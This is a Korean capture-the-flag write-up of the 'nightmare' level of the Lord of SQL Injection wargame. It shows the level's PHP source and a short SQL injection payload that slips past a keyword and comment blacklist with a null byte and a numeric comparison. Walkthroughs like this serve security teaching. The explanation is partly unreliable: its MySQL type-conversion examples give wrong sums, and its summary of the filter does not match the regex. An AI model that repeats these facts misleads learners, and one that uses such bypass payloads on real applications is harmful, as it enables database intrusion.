# Lord of SQL Injection No.18 - nightmare
## 문제 출제 의도
SQL Injection을 통해 원하는 값을 select 할 수 있는지 확인한다. 
## 소스 코드 분석
+ 소스 코드
nightmare의 소스코드는 다음과 같다.
    ~~~
    <?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
    $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) solve("nightmare"); 
    highlight_file(__FILE__); 
    ?>
    ~~~
+ 소스 코드 분석 <hr>
    - preg_match
        * GET방식으로 입력받은 pw값에 prob, . , ( , ) , # , _ 중 어떤 값이라도 존재하면 "No Hack ~_~"이 출력되고 문제 풀이에 실패한다.

    - strlen함수
        * strlen — 문자열 길이를 얻는다.
        * 다음은 strlen함수가 취하는 형태이다.
        ~~~
        int strlen ( string $string )
        ~~~
        * 만약 문자열이 비어있다면 0을 반환한다.
        * 따라서 입력한 pw의 길이가 6글자 이하여야 한다.
    - 문제 풀이 조건
        * 쿼리문을 통해 데이터베이스에서 받아온 id연관배열의 값이 0이 아니라면 문제 해결에 성공한다.
## 문제 해결
- 주석 우회방법
    + 주석이 밴 당했음으로 이를 우회할 문자를 찾아야한다.
        1. ;%00은 주석역할을 한다.
        2. /* 또한 주석의 자리에 들어갈 수 있지만 MySql 5.1 버전 이하에서만 가능하다.
- 자동 형 변환
    + MySql에서 문자열 관련 자료형이 숫자 자료형으로 변환되는 경우 문자열에서 문자가 나오기 전에 나오는 숫자만 변환된다.
    + 다음은 그 예이다.
    ~~~
    "12xdsf"+ 3 = 12
    "kkqa23231" + 4 = 0
    "1kas331" + 10 = 1
    ~~~
    + 따라서 이를 이용하여 추가 문자열을 URL뒤에 삽입하면 문제가 해결된다.
- 추가 문자열
    ~~~
    ?pw='%2b0);%00
    ~~~  
    + 이떄 %2b는 '+' 이다.
    + 위 문자열은 결국 비어있는 문자열과 숫자를 비교함으로 0을 출력하여 WHERE구문을 무력화하여 모든 pw 값을 가져온다.